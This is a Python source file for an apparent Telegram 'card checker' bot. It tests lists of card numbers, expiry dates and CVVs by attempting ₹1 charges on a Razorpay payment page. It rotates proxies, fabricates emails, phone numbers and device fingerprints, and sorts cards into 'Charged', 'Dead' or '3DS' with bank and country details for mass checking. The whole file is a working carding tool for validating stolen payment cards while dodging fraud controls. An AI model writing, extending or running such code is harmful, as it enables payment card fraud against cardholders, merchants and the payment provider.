import aiohttp
import asyncio
import re
import json
import random
import string
import logging
import hashlib
import base64
import urllib.parse
import time
from datetime import datetime

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

def sanitize_error_message(error_str):
    """Remove proxy URLs and credentials from error messages"""
    import re
    sanitized = re.sub(r"url='[^']*'", "url='[PROXY]'", str(error_str))
    sanitized = re.sub(r'http://[^@]+@[^/\s]+', '[PROXY]', sanitized)
    sanitized = re.sub(r'https://[^@]+@[^/\s]+', '[PROXY]', sanitized)
    if '407' in sanitized:
        return "Proxy authentication failed - trying next proxy"
    return sanitized

def to_monospace(text):
    result = []
    for char in text:
        code = ord(char)
        if 65 <= code <= 90:
            result.append(chr(0x1D670 + (code - 65)))
        elif 97 <= code <= 122:
            result.append(chr(0x1D68A + (code - 97)))
        elif 48 <= code <= 57:
            result.append(chr(0x1D7F6 + (code - 48)))
        else:
            result.append(char)
    return ''.join(result)

class RazorpayProcessor:
    def __init__(self):
        self.request_timeout = aiohttp.ClientTimeout(total=30)
        self.bin_cache = {}
        self.razorpay_page_url = 'https://pages.razorpay.com/paywebicent'
        self.payment_page_id = 'pl_F4nKNAyaqwecFg'
        self.payment_page_item_id = 'ppi_F4nKNHUJswbQ5b'
        self.amount = 100
        self.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        self.batch_size = 1
        self.cooldown_seconds = 20
        self.proxy_pool = []
        self.proxy_index = 0
        self.load_proxies()

    def load_proxies(self):
        import os
        if os.path.exists('proxies.txt'):
            with open('proxies.txt', 'r') as f:
                self.proxy_pool = [line.strip() for line in f if line.strip() and not line.strip().startswith('#')]
            random.shuffle(self.proxy_pool)
            logger.info(f"Loaded {len(self.proxy_pool)} proxies for Gate 3")

    def get_next_proxy(self):
        if not self.proxy_pool:
            return None
        proxy = self.proxy_pool[self.proxy_index % len(self.proxy_pool)]
        self.proxy_index += 1
        return proxy

    def normalize_card_format(self, card_line):
        try:
            parts = card_line.strip().split('|')
            if len(parts) < 4:
                return None
            cc, mm, yy_or_yyyy, cvv = parts[0], parts[1], parts[2], parts[3]
            yy = yy_or_yyyy[-2:] if len(yy_or_yyyy) == 4 else yy_or_yyyy
            return f"{cc}|{mm}|{yy}|{cvv}"
        except Exception:
            return None

    def generate_device_id(self):
        timestamp = str(int(time.time() * 1000))
        random_part = str(random.randint(10000000, 99999999))
        hash_part = hashlib.md5(f"{timestamp}{random.random()}".encode()).hexdigest()
        return f"1.{hash_part}.{timestamp}.{random_part}"

    def generate_unified_session(self):
        chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
        return ''.join(random.choice(chars) for _ in range(14))

    def generate_random_email(self):
        username = ''.join(random.choice(string.ascii_lowercase) for _ in range(10))
        domains = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com"]
        domain = random.choice(domains)
        return f"{username}@{domain}"

    def generate_random_phone(self):
        return ''.join(random.choice(string.digits) for _ in range(10))

    async def fetch_bin_info(self, bin_number):
        try:
            if bin_number in self.bin_cache:
                return self.bin_cache[bin_number]
            async with aiohttp.ClientSession() as session:
                async with session.get(f'https://bins.antipublic.cc/bins/{bin_number}') as response:
                    if response.status == 200:
                        data = await response.json()
                        self.bin_cache[bin_number] = {
                            'bin': data.get('bin', 'N/A'),
                            'brand': data.get('brand', 'N/A'),
                            'country': data.get('country_name', 'N/A'),
                            'country_flag': data.get('country_flag', ''),
                            'country_emoji': data.get('country_emoji', ''),
                            'bank': data.get('bank', 'N/A'),
                            'level': data.get('level', 'N/A'),
                            'type': data.get('type', 'N/A')
                        }
                        return self.bin_cache[bin_number]
        except Exception as e:
            logger.error(f"BIN lookup error: {str(e)}")
        return None

    async def process_card(self, card_data):
        start_time = datetime.now()
        try:
            normalized = self.normalize_card_format(card_data)
            if not normalized:
                return {
                    "status": "error",
                    "card": card_data,
                    "message": "Invalid card format",
                    "raw_response": "Invalid format",
                    "check_time": 0
                }
            
            parts = normalized.split('|')
            card_number, exp_month, exp_year, cvv = parts
            
            email = self.generate_random_email()
            phone = self.generate_random_phone()
            proxy = self.get_next_proxy()
            
            connector = aiohttp.TCPConnector(ssl=False)
            
            async with aiohttp.ClientSession(timeout=self.request_timeout, connector=connector) as session:
                headers = {
                    'User-Agent': self.user_agent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Connection': 'keep-alive',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Upgrade-Insecure-Requests': '1'
                }
                
                async with session.get(self.razorpay_page_url, headers=headers, proxy=proxy) as response:
                    page_text = await response.text()
                    
                    if response.status != 200:
                        check_time = (datetime.now() - start_time).total_seconds()
                        return {
                            "status": "error",
                            "card": card_data,
                            "message": f"Failed to load payment page: HTTP {response.status}",
                            "raw_response": f"HTTP {response.status}",
                            "check_time": check_time
                        }
                    
                    patterns = [
                        r'"key_id"\s*:\s*"([^"]+)"',
                        r'key_id\s*=\s*"([^"]+)"',
                        r'data-key-id="([^"]+)"',
                        r'key_id["\']?\s*[:=]\s*["\']([^"\']+)["\']'
                    ]
                    
                    key_id = None
                    for pattern in patterns:
                        key_match = re.search(pattern, page_text)
                        if key_match:
                            key_id = key_match.group(1)
                            break
                    
                    if not key_id:
                        check_time = (datetime.now() - start_time).total_seconds()
                        return {
                            "status": "error",
                            "card": card_data,
                            "message": "Failed to extract key_id",
                            "raw_response": "Key extraction failed",
                            "check_time": check_time
                        }
                
                order_payload = {
                    'line_items': [{'payment_page_item_id': self.payment_page_item_id, 'amount': self.amount}],
                    'notes': {'email': email, 'phone': phone, 'purpose': 'Advance payment'}
                }
                
                order_headers = {
                    'Content-Type': 'application/json',
                    'User-Agent': self.user_agent
                }
                
                async with session.post(
                    f'https://api.razorpay.com/v1/payment_pages/{self.payment_page_id}/order',
                    headers=order_headers,
                    json=order_payload,
                    proxy=proxy
                ) as order_response:
                    if order_response.status != 200:
                        check_time = (datetime.now() - start_time).total_seconds()
                        return {
                            "status": "error",
                            "card": card_data,
                            "message": "Order creation failed",
                            "raw_response": f"HTTP {order_response.status}",
                            "check_time": check_time
                        }
                    
                    order_data = await order_response.json()
                    order_id = order_data.get('order', {}).get('id')
                    
                    if not order_id:
                        check_time = (datetime.now() - start_time).total_seconds()
                        return {
                            "status": "error",
                            "card": card_data,
                            "message": "No order_id in response",
                            "raw_response": "Order ID missing",
                            "check_time": check_time
                        }
                
                device_id = self.generate_device_id()
                unified_session_id = self.generate_unified_session()
                keyless_header = 'api_v1:KzXmzqcw1by1S44tb/N9WQhWtUHwmy9yqkl9Izr3C8P2s1A1bpGkvmj5TLmZPZYlEdB9Hm+TQyEMj5G+yfOB6B9yqhItUQ=='
                
                checkout_params = {
                    'traffic_env': 'production',
                    'build': '9cb57fdf457e44eac4384e182f925070ff5488d9',
                    'build_v1': '715e3c0a534a4e4fa59a19e1d2a3cc3daf1837e2',
                    'checkout_v2': '1',
                    'new_session': '1',
                    'keyless_header': keyless_header,
                    'rzp_device_id': device_id,
                    'unified_session_id': unified_session_id
                }
                
                checkout_headers = {
                    'Accept': 'text/html',
                    'Referer': 'https://pages.razorpay.com/',
                    'User-Agent': self.user_agent,
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Connection': 'keep-alive'
                }
                
                async with session.get(
                    'https://api.razorpay.com/v1/checkout/public',
                    headers=checkout_headers,
                    params=checkout_params,
                    proxy=proxy
                ) as checkout_response:
                    checkout_text = await checkout_response.text()
                    
                    if checkout_response.status != 200:
                        check_time = (datetime.now() - start_time).total_seconds()
                        return {
                            "status": "error",
                            "card": card_data,
                            "message": "Checkout page load failed",
                            "raw_response": f"HTTP {checkout_response.status}",
                            "check_time": check_time
                        }
                    
                    token_patterns = [
                        r'window\.session_token\s*=\s*"([^"]+)"',
                        r'session_token\s*:\s*"([^"]+)"',
                        r'"session_token"\s*:\s*"([^"]+)"',
                        r'data-session-token="([^"]+)"'
                    ]
                    
                    session_token = None
                    for pattern in token_patterns:
                        token_match = re.search(pattern, checkout_text)
                        if token_match:
                            session_token = token_match.group(1)
                            break
                    
                    if not session_token:
                        check_time = (datetime.now() - start_time).total_seconds()
                        return {
                            "status": "error",
                            "card": card_data,
                            "message": "Session token extraction failed",
                            "raw_response": "Token extraction failed",
                            "check_time": check_time
                        }
                
                checkout_id = f"RRh{hashlib.md5(str(time.time()).encode()).hexdigest()[:10]}"
                fingerprint_payload = base64.b64encode(f"fp_{time.time()}_{random.random()}".encode()).decode()
                
                form_data = {
                    'notes[email]': email,
                    'notes[phone]': phone,
                    'notes[purpose]': 'Advance payment',
                    'payment_link_id': self.payment_page_id,
                    'key_id': key_id,
                    'contact': f'+91{phone}',
                    'email': email,
                    'currency': 'INR',
                    '_[integration]': 'payment_pages',
                    '_[checkout_id]': checkout_id,
                    '_[device.id]': device_id,
                    '_[library]': 'checkoutjs',
                    '_[platform]': 'browser',
                    '_[referer]': self.razorpay_page_url,
                    'amount': str(self.amount),
                    'order_id': order_id,
                    'device_fingerprint[fingerprint_payload]': fingerprint_payload,
                    'method': 'card',
                    'card[number]': card_number.replace(' ', ''),
                    'card[cvv]': cvv,
                    'card[name]': 'Test User',
                    'card[expiry_month]': exp_month.zfill(2),
                    'card[expiry_year]': f"20{exp_year}" if len(exp_year) == 2 else exp_year,
                    'save': '0',
                    'dcc_currency': 'INR'
                }
                
                payment_params = {
                    'key_id': key_id,
                    'session_token': session_token,
                    'keyless_header': keyless_header
                }
                
                payment_headers = {
                    'Content-type': 'application/x-www-form-urlencoded',
                    'User-Agent': 'Mozilla/5.0',
                    'x-session-token': session_token,
                    'Accept': 'application/json',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Origin': 'https://api.razorpay.com',
                    'Referer': f'https://api.razorpay.com/v1/checkout/public?{urllib.parse.urlencode(payment_params)}'
                }
                
                async with session.post(
                    'https://api.razorpay.com/v1/standard_checkout/payments/create/ajax',
                    params=payment_params,
                    headers=payment_headers,
                    data=form_data,
                    proxy=proxy
                ) as payment_response:
                    check_time = (datetime.now() - start_time).total_seconds()
                    payment_text = await payment_response.text()
                    http_status = payment_response.status
                    
                    try:
                        payment_json = json.loads(payment_text)
                    except:
                        return {
                            "status": "error",
                            "card": card_data,
                            "message": "Invalid response",
                            "raw_response": payment_text[:200] if payment_text else "Empty response",
                            "check_time": check_time
                        }
                    
                    if http_status == 401:
                        error_data = payment_json.get('error', {})
                        if isinstance(error_data, dict):
                            error_desc = error_data.get('description', 'Authentication failed')
                            error_code = error_data.get('code', '')
                            raw_resp = f"{error_desc} | [{error_code}]" if error_code else error_desc
                        else:
                            error_desc = str(error_data) if error_data else 'Authentication failed'
                            raw_resp = error_desc
                        return {
                            "status": "declined",
                            "card": card_data,
                            "message": error_desc,
                            "raw_response": raw_resp,
                            "check_time": check_time
                        }
                    
                    if http_status != 200:
                        error_data = payment_json.get('error', {})
                        if isinstance(error_data, dict):
                            error_desc = error_data.get('description', f'Gateway error HTTP {http_status}')
                        else:
                            error_desc = f'Gateway error HTTP {http_status}'
                        return {
                            "status": "declined",
                            "card": card_data,
                            "message": error_desc,
                            "raw_response": payment_text[:200] if payment_text else f"HTTP {http_status}",
                            "check_time": check_time
                        }
                    
                    if 'error' in payment_json:
                        error_data = payment_json['error']
                        if isinstance(error_data, dict):
                            error_desc = error_data.get('description', 'Unknown error')
                            error_code = error_data.get('code', '')
                            error_reason = error_data.get('reason', '')
                            error_source = error_data.get('source', '')
                            raw_parts = []
                            if error_desc:
                                raw_parts.append(error_desc)
                            if error_reason:
                                raw_parts.append(f"reason: {error_reason}")
                            if error_code:
                                raw_parts.append(f"[{error_code}]")
                            if error_source:
                                raw_parts.append(f"source: {error_source}")
                            raw_resp = " | ".join(raw_parts) if raw_parts else str(error_data)
                            return {
                                "status": "declined",
                                "card": card_data,
                                "message": error_desc,
                                "raw_response": raw_resp,
                                "check_time": check_time
                            }
                        else:
                            return {
                                "status": "declined",
                                "card": card_data,
                                "message": str(error_data),
                                "raw_response": str(error_data),
                                "check_time": check_time
                            }
                    
                    if payment_json.get('type') == 'redirect' or payment_json.get('redirect') == True:
                        logger.info(f"Redirect response: {json.dumps(payment_json)[:500]}")
                        request_info = payment_json.get('request', {})
                        
                        if 'error' in payment_json:
                            error_data = payment_json['error']
                            if isinstance(error_data, dict):
                                error_code = error_data.get('code', 'UNKNOWN_ERROR')
                                error_desc = error_data.get('description', 'Unknown error')
                            else:
                                error_code = 'ERROR'
                                error_desc = str(error_data)
                            check_time = (datetime.now() - start_time).total_seconds()
                            return {
                                "status": "declined",
                                "card": card_data,
                                "message": error_desc,
                                "raw_response": f"{error_code} | {error_desc}",
                                "check_time": check_time
                            }
                        
                        if 'error' in request_info:
                            error_data = request_info['error']
                            if isinstance(error_data, dict):
                                error_code = error_data.get('code', 'UNKNOWN_ERROR')
                                error_desc = error_data.get('description', 'Unknown error')
                            else:
                                error_code = 'ERROR'
                                error_desc = str(error_data)
                            check_time = (datetime.now() - start_time).total_seconds()
                            return {
                                "status": "declined",
                                "card": card_data,
                                "message": error_desc,
                                "raw_response": f"{error_code} | {error_desc}",
                                "check_time": check_time
                            }
                        
                        payment_id = payment_json.get('payment_id', '')
                        auth_url = request_info.get('url', '')
                        auth_error_msg = None
                        auth_error_code = None
                        
                        if payment_id:
                            try:
                                await asyncio.sleep(1)
                                
                                status_headers = {
                                    'User-Agent': 'Mozilla/5.0',
                                    'Accept': 'application/json',
                                    'Accept-Language': 'en-US,en;q=0.5'
                                }
                                
                                status_url = f"https://api.razorpay.com/v1/standard_checkout/payments/{payment_id}"
                                async with session.get(status_url, headers=status_headers, proxy=proxy) as status_response:
                                    status_text = await status_response.text()
                                    logger.info(f"Payment status response: {status_text[:500]}")
                                    try:
                                        status_json = json.loads(status_text)
                                        if 'error' in status_json:
                                            error_data = status_json['error']
                                            if isinstance(error_data, dict):
                                                auth_error_code = error_data.get('code', 'UNKNOWN_ERROR')
                                                auth_error_msg = error_data.get('description', 'Unknown error')
                                            else:
                                                auth_error_msg = str(error_data)
                                                auth_error_code = 'ERROR'
                                        elif status_json.get('status') == 'failed':
                                            auth_error_code = status_json.get('error_code', 'PAYMENT_FAILED')
                                            auth_error_msg = status_json.get('error_description', 'Payment failed')
                                            error_reason = status_json.get('error_reason', '')
                                            if error_reason:
                                                auth_error_msg = f"{auth_error_msg} ({error_reason})"
                                    except json.JSONDecodeError:
                                        logger.warning(f"Payment status not JSON: {status_text[:200]}")
                            except Exception as e:
                                logger.warning(f"Payment status check failed: {str(e)}")
                        
                        if not auth_error_msg and auth_url:
                            try:
                                auth_headers = {
                                    'Content-type': 'application/x-www-form-urlencoded',
                                    'User-Agent': self.user_agent,
                                    'Accept': 'application/json',
                                    'Origin': 'https://api.razorpay.com',
                                    'Referer': 'https://api.razorpay.com/'
                                }
                                
                                async with session.post(auth_url, headers=auth_headers, data={}, proxy=proxy) as auth_response:
                                    auth_text = await auth_response.text()
                                    logger.info(f"Auth response: {auth_text[:500]}")
                                    try:
                                        auth_json = json.loads(auth_text)
                                        if 'error' in auth_json:
                                            error_data = auth_json['error']
                                            if isinstance(error_data, dict):
                                                auth_error_code = error_data.get('code', 'UNKNOWN_ERROR')
                                                auth_error_msg = error_data.get('description', 'Unknown error')
                                            else:
                                                auth_error_msg = str(error_data)
                                                auth_error_code = 'ERROR'
                                    except json.JSONDecodeError:
                                        logger.warning(f"Auth response not JSON: {auth_text[:200]}")
                            except Exception as e:
                                logger.warning(f"Auth URL request failed: {str(e)}")
                        
                        check_time = (datetime.now() - start_time).total_seconds()
                        
                        if auth_error_msg:
                            return {
                                "status": "declined",
                                "card": card_data,
                                "message": auth_error_msg,
                                "raw_response": f"{auth_error_code} | {auth_error_msg}",
                                "check_time": check_time
                            }
                        
                        return {
                            "status": "declined",
                            "card": card_data,
                            "message": "3DS Authentication Required",
                            "raw_response": "3DS_REDIRECT | Authentication Required",
                            "check_time": check_time
                        }
                    
                    if payment_json.get('payment_id') or payment_json.get('razorpay_payment_id'):
                        payment_id = payment_json.get('payment_id') or payment_json.get('razorpay_payment_id', '')
                        raw_resp = f"payment_id: {payment_id}"
                        return {
                            "status": "charged",
                            "card": card_data,
                            "message": "Payment Successful",
                            "raw_response": raw_resp,
                            "check_time": check_time
                        }
                    
                    raw_resp = payment_text[:300] if payment_text else "Unknown response"
                    return {
                        "status": "declined",
                        "card": card_data,
                        "message": "Card declined",
                        "raw_response": raw_resp,
                        "check_time": check_time
                    }
                        
        except asyncio.TimeoutError:
            check_time = (datetime.now() - start_time).total_seconds()
            return {
                "status": "error",
                "card": card_data,
                "message": "Request timeout",
                "raw_response": "Timeout",
                "check_time": check_time
            }
        except Exception as e:
            check_time = (datetime.now() - start_time).total_seconds()
            error_msg = sanitize_error_message(str(e))
            logger.error(f"Card processing error: {error_msg}")
            return {
                "status": "error",
                "card": card_data,
                "message": error_msg,
                "raw_response": error_msg,
                "check_time": check_time
            }

    def format_charged_message(self, card, bin_info, check_time, user, response):
        bin_info = bin_info or {}
        brand = bin_info.get('brand', 'N/A').upper()
        card_type = bin_info.get('type', 'N/A').upper()
        level = bin_info.get('level', 'N/A').upper()
        bank = bin_info.get('bank', 'N/A').upper()
        country = bin_info.get('country', 'N/A').upper()
        country_flag = bin_info.get('country_flag', '') or bin_info.get('country_emoji', '')
        
        bin_display = f"{to_monospace(brand)} - {to_monospace(card_type)} - {to_monospace(level)}"
        bank_display = to_monospace(bank)
        country_display = to_monospace(country)
        
        username = user.username if user.username else user.full_name
        user_link = f"tg://user?id={user.id}"
        bot_link = "https://t.me/trial9pm"
        
        return f"""TRIAL 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 <a href="{bot_link}">✿</a>
- - - - - - - - - - - - - - - - - - - - - - - -
<a href="{bot_link}">[⌯]</a> 𝗖𝗮𝗿𝗱 ⌁ <code>{card}</code>
<a href="{bot_link}">[⌯]</a> 𝗦𝘁𝗮𝘁𝘂𝘀 ⌁ {to_monospace('Charged')} -» {to_monospace('₹1')}
<a href="{bot_link}">[⌯]</a> 𝗥𝗲𝘀𝘂𝗹𝘁 ⌁ {to_monospace(response)}

<a href="{bot_link}">[⌯]</a> 𝗕𝗶𝗻 ⌁ {bin_display}
<a href="{bot_link}">[⌯]</a> 𝗕𝗮𝗻𝗸 ⌁ {bank_display}
<a href="{bot_link}">[⌯]</a> 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ⌁ {country_display} {country_flag}

<a href="{bot_link}">[⌯]</a> 𝗚𝗮𝘁𝗲 ⌁ {to_monospace('Razorpay')} {to_monospace('₹1')}
<a href="{bot_link}">[⌯]</a> 𝗧𝗶𝗺𝗲 ⌁ {to_monospace(f'{check_time:.2f}')}'s
<a href="{bot_link}">[⌯]</a> 𝗨𝘀𝗲𝗱 𝗕𝘆 ⌁ <a href="{user_link}">{to_monospace(username)}</a>
- - - - - - - - - - - - - - - - - - - - - - - -"""

    def format_declined_message(self, card, bin_info, check_time, user, response):
        bin_info = bin_info or {}
        brand = bin_info.get('brand', 'N/A').upper()
        card_type = bin_info.get('type', 'N/A').upper()
        level = bin_info.get('level', 'N/A').upper()
        bank = bin_info.get('bank', 'N/A').upper()
        country = bin_info.get('country', 'N/A').upper()
        country_flag = bin_info.get('country_flag', '') or bin_info.get('country_emoji', '')
        
        bin_display = f"{to_monospace(brand)} - {to_monospace(card_type)} - {to_monospace(level)}"
        bank_display = to_monospace(bank)
        country_display = to_monospace(country)
        
        username = user.username if user.username else user.full_name
        user_link = f"tg://user?id={user.id}"
        bot_link = "https://t.me/trial9pm"
        
        return f"""TRIAL 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 <a href="{bot_link}">✿</a>
- - - - - - - - - - - - - - - - - - - - - - - -
<a href="{bot_link}">[⌯]</a> 𝗖𝗮𝗿𝗱 ⌁ <code>{card}</code>
<a href="{bot_link}">[⌯]</a> 𝗦𝘁𝗮𝘁𝘂𝘀 ⌁ {to_monospace('Dead!')} ❌
<a href="{bot_link}">[⌯]</a> 𝗥𝗲𝘀𝘂𝗹𝘁 ⌁ {to_monospace(response)}

<a href="{bot_link}">[⌯]</a> 𝗕𝗶𝗻 ⌁ {bin_display}
<a href="{bot_link}">[⌯]</a> 𝗕𝗮𝗻𝗸 ⌁ {bank_display}
<a href="{bot_link}">[⌯]</a> 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ⌁ {country_display} {country_flag}

<a href="{bot_link}">[⌯]</a> 𝗚𝗮𝘁𝗲 ⌁ {to_monospace('Razorpay')} {to_monospace('₹1')}
<a href="{bot_link}">[⌯]</a> 𝗧𝗶𝗺𝗲 ⌁ {to_monospace(f'{check_time:.2f}')}'s
<a href="{bot_link}">[⌯]</a> 𝗨𝘀𝗲𝗱 𝗕𝘆 ⌁ <a href="{user_link}">{to_monospace(username)}</a>
- - - - - - - - - - - - - - - - - - - - - - - -"""

    def format_3ds_message(self, card, bin_info, check_time, user, response):
        bin_info = bin_info or {}
        brand = bin_info.get('brand', 'N/A').upper()
        card_type = bin_info.get('type', 'N/A').upper()
        level = bin_info.get('level', 'N/A').upper()
        bank = bin_info.get('bank', 'N/A').upper()
        country = bin_info.get('country', 'N/A').upper()
        country_flag = bin_info.get('country_flag', '') or bin_info.get('country_emoji', '')
        
        bin_display = f"{to_monospace(brand)} - {to_monospace(card_type)} - {to_monospace(level)}"
        bank_display = to_monospace(bank)
        country_display = to_monospace(country)
        
        username = user.username if user.username else user.full_name
        user_link = f"tg://user?id={user.id}"
        bot_link = "https://t.me/trial9pm"
        
        return f"""TRIAL 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 <a href="{bot_link}">✿</a>
- - - - - - - - - - - - - - - - - - - - - - - -
<a href="{bot_link}">[⌯]</a> 𝗖𝗮𝗿𝗱 ⌁ <code>{card}</code>
<a href="{bot_link}">[⌯]</a> 𝗦𝘁𝗮𝘁𝘂𝘀 ⌁ {to_monospace('3DS')} 🔐
<a href="{bot_link}">[⌯]</a> 𝗥𝗲𝘀𝘂𝗹𝘁 ⌁ {to_monospace(response)}

<a href="{bot_link}">[⌯]</a> 𝗕𝗶𝗻 ⌁ {bin_display}
<a href="{bot_link}">[⌯]</a> 𝗕𝗮𝗻𝗸 ⌁ {bank_display}
<a href="{bot_link}">[⌯]</a> 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ⌁ {country_display} {country_flag}

<a href="{bot_link}">[⌯]</a> 𝗚𝗮𝘁𝗲 ⌁ {to_monospace('Razorpay')} {to_monospace('₹1')}
<a href="{bot_link}">[⌯]</a> 𝗧𝗶𝗺𝗲 ⌁ {to_monospace(f'{check_time:.2f}')}'s
<a href="{bot_link}">[⌯]</a> 𝗨𝘀𝗲𝗱 𝗕𝘆 ⌁ <a href="{user_link}">{to_monospace(username)}</a>
- - - - - - - - - - - - - - - - - - - - - - - -"""

    def format_mass_check_started(self):
        return f"""━━━━━━━━━━━━━━━━━━━━━━
TRIAL 𝗠𝗔𝗦𝗦 𝗖𝗛𝗘𝗖𝗞 𝗦𝗧𝗔𝗥𝗧𝗘𝗗 ✿
𝗚𝗮𝘁𝗲 ⌁ {to_monospace('Razorpay')} {to_monospace('₹1')}
𝗣𝗹𝗲𝗮𝘀𝗲 𝘄𝗮𝗶𝘁......
━━━━━━━━━━━━━━━━━━━━━━"""
